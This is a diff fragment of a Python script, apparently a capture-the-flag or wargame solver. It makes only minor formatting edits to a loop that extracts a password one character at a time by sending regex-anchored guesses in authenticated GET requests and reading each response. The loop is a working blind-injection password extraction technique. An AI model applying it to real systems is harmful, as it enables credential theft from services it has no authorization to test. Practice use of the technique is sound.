@@ -29,13 +29,13 @@ for i in range(0, 64):
         break               # then i should be larger than length so no more chars can 
                             # be appended to password     
     for c in contains:
-        temp = "^" + password + c;  
+        temp = "^" + password + c 
         temp = site.format(temp)
         r = requests.get(temp, auth=(user, pswd))
         if exist not in r.text:
             password += c
             print("Password: {}".format(password))
             break
-     
+
 print("Password: {}".format(password))
 
